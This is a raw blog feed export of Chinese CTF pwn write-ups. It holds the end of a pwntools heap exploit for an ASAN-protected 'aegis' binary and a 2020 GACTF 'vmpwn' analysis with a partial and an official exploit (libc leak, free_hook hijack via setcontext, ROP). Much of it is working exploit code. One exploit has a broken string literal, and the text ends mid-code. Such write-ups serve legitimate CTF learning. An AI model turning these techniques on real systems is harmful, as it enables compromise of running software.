class="token punctuation">.</span>update<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./aegis"</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"aegis"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x18a7)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x10a45c</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ID: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"New Content: "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"New ID: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">secret</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Lucky Number: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">0x112233445566778</span><span class="token punctuation">)</span>secret<span class="token punctuation">(</span><span class="token number">0xc047fff8004</span><span class="token punctuation">)</span>update<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x123456789</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># modify chunk size from 0x10000010 to 0x10000000</span>update<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x02ffffff00000002</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x01f000000002ff</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x602000000018</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>elf<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x114AB0</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"elf address {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>update<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> puts_got <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># strlen = 1</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc address {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>_ZN11__sanitizerL15UserDieCallbackE_address <span class="token operator">=</span> elf<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0xFB0888</span>update<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>_ZN11__sanitizerL15UserDieCallbackE_address<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>one_gadget <span class="token operator">+=</span> libc<span class="token punctuation">.</span>addressgdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>update<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> one_gadget<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 补充知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASAN保护 </tag>
            
            <tag> 影子内存概念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM-PWN题总结（一）</title>
      <link href="/2020/10/29/vm-pwn-ti-zong-jie-yi/"/>
      <url>/2020/10/29/vm-pwn-ti-zong-jie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-GACTF-vmpwn"><a href="#2020-GACTF-vmpwn" class="headerlink" title="2020 GACTF vmpwn"></a>2020 GACTF vmpwn</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/0.png"></div>libc 2.23，保护全开<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/1.png"></div>我们看到分配的有0x30的chunk，该chunk的作用是前面0x18大小作为rdi、rsi、rdx三个寄存器参数。程序会再分配两个大chunk其中一个作为读取name以及后面的信息。接下来就是指令解析了：0x30chunk[5]地址既是指令获取的地方又是读取数据赋值给前面的rdi、rsi、rdx的地方，甚至最后调用函数指针的偏移也是可控的：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/2.png"></div>指令比较多就不一一讲解了，当时花了半天时间逆了好久，逻辑可以说七七八八了，前面所执行的显示的数据都是bss段中的内容，八个八个读到rdi位置，然后调用函数指针打印。read也是通过bss中数据来调用指令，最后call read函数。<p>由于调试过程中看到第一次数据直接被打印出来，第二次数据没有使用，就没考虑到什么思路，不过发现的漏洞是输入可以向后溢出，后面有两个heap地址，如果当时仔细点就可以发现，第二个heap地址是程序指定退出时所执行指令的地址，该地址里面是0xff，刚好就直接退出了。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/vm-pwn-ti-zong-jie-yi/3.png"></div>可惜！<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先可以溢出修改到指定退出执行的code地址，其次可以调用的函数有：free\write\read\puts，知道这些内容那这样的话就有思路了。</p><p><strong>1. 利用溢出，在打印出name的时候打印出第一个heap地址，那么就可以利用偏移获得自己输入的code的位置<br>2. 再利用溢出修改指定返回所执行的code地址，那么就进入我们的程序逻辑了。<br>3. 布置参数，free一个大chunk，通过write打印libc地址<br>4. 改freehook为setcontext，free一个chunk，里面布置好参数，后面接rop，orw来获得flag</strong></p><p>如果知道那个关键点，这道题肯定出了，哎。。。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>我的exp，泄露libc地址，开始读下一段code，后面麻烦又简单，就先停下了</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux','split','-h']</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = process('./vmpwn',env={'LD_PRELOAD':'./libc-2.23.so'})</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vmpwn"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#泄露虚拟机的mem地址</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xF0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xF0</span><span class="token punctuation">)</span>vm_mem_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'vm_mem_addr='</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>vm_mem_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x555555758050</span>vm_shellcode_addr <span class="token operator">=</span> vm_mem_addr <span class="token operator">+</span> <span class="token number">0x2E20</span> <span class="token comment" spellcheck="true"># 0x55555575ae70</span>success<span class="token punctuation">(</span><span class="token string">"vm shellcode addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>vm_shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc address</span><span class="token comment" spellcheck="true"># 1 free large  3. read shellcode</span>vm_shellcode <span class="token operator">=</span> <span class="token string">"\x11"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x555555758050</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rdi = 0x555555758050 9b</span>vm_shellcode<span class="token operator">+=</span> <span class="token string">"\x8f\x03"</span> <span class="token comment" spellcheck="true"># offset 0x18 call free function 2b</span><span class="token comment" spellcheck="true"># 2. write leak libc</span>vm_shellcode<span class="token operator">+=</span> <span class="token string">"\x11"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rdi = 1  9b</span>vm_shellcode<span class="token operator">+=</span> <span class="token string">"\x8f\x01"</span> <span class="token comment" spellcheck="true"># call write 2b</span><span class="token comment" spellcheck="true"># 3 read shellcode</span>vm_shellcode<span class="token operator">+=</span> <span class="token string">"\x6d"</span> <span class="token comment" spellcheck="true"># rdi=0 1b</span>vm_shellcode<span class="token operator">+=</span> <span class="token string">"\x62"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x2E20</span><span class="token operator">+</span><span class="token number">43</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rsi = rsi + vm_shellcode_addr 9b</span>vm_shellcode<span class="token operator">+=</span> <span class="token string">"\x63"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rdx = 0x100 9b</span>vm_shellcode<span class="token operator">+=</span> <span class="token string">"\x8f\x00"</span> <span class="token comment" spellcheck="true"># call read</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>vm_shellcode_addr<span class="token punctuation">)</span><span class="token operator">+</span>vm_shellcodep<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'say:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># modify free_hook to setcontext getshell</span>vm_shellcode <span class="token operator">=</span> <span class="token string">"\x"</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7dd1b78</span><span class="token operator">+</span><span class="token number">0x7ffff7a0d000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux','split','-h']</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>malloc_hook_s <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook_s <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#opcodes</span>MOV_RAX_RSP <span class="token operator">=</span> <span class="token number">0x10</span>MOV_RAX_I <span class="token operator">=</span> <span class="token number">0x11</span>MOV_RBX_I <span class="token operator">=</span> <span class="token number">0x12</span>MOV_RCX_I <span class="token operator">=</span> <span class="token number">0x13</span>MOV_RAX_MEM_ADDR <span class="token operator">=</span> <span class="token number">0x20</span>MOV_RAX_MEM <span class="token operator">=</span> <span class="token number">0x21</span>PUSH_RAX <span class="token operator">=</span> <span class="token number">0x44</span>POP_RBX <span class="token operator">=</span> <span class="token number">0x52</span>ZERO_RAX <span class="token operator">=</span> <span class="token number">0x6D</span>SYSCALL <span class="token operator">=</span> <span class="token number">0x8F</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vmpwn'</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># sh = process("./vmpwn")</span><span class="token comment" spellcheck="true"># sh = remote('127.0.0.1',8666)</span><span class="token comment" spellcheck="true">#泄露虚拟机的mem地址</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xF0</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xF0</span><span class="token punctuation">)</span>vm_mem_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'vm_mem_addr='</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>vm_mem_addr<span class="token punctuation">)</span>vm_shellcode_addr <span class="token operator">=</span> vm_mem_addr <span class="token operator">+</span> <span class="token number">0x2E20</span><span class="token comment" spellcheck="true">#cpu->rax = &amp;mem</span>vm_shellcode <span class="token operator">=</span> p8<span class="token punctuation">(</span>MOV_RAX_MEM_ADDR<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#free(cpu->rax)，使得main_arena+88的地址被保存到mem中</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>SYSCALL<span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将main_arena+88的地址存入cpu->rax中</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RAX_MEM<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#调用write输出main_arena+88里的数据</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>PUSH_RAX<span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>POP_RBX<span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RAX_I<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RCX_I<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>SYSCALL<span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#继续调用read输入shellcode</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>ZERO_RAX<span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RBX_I<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vm_shellcode_addr <span class="token operator">+</span> len<span class="token punctuation">(</span>vm_shellcode<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RCX_I<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>SYSCALL<span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vm_shellcode_addr<span class="token punctuation">)</span> <span class="token operator">+</span> vm_shellcodesh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'say:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Now,I recevie your message,bye~'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>main_arena_88 <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc_hook_addr <span class="token operator">=</span> <span class="token punctuation">(</span>main_arena_88 <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>malloc_hook_s <span class="token operator">&amp;</span> <span class="token number">0xFFF</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook_addr <span class="token operator">-</span> malloc_hook_sfree_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> free_hook_sopen_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>setcontext_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000021112</span>pop_rsi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000202f8</span>pop_rdx <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000001b92</span>bss <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'libc_base='</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'free_hook_addr='</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'setcontext_addr='</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>setcontext_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#调用read向free_hook处输入数据，然后触发free，getshell</span>vm_shellcode <span class="token operator">=</span> p8<span class="token punctuation">(</span>ZERO_RAX<span class="token punctuation">)</span>vm_shellcode <span class="token operator">+=</span> p8<span class="token punctuation">(</span>MOV_RBX_I<span class="token 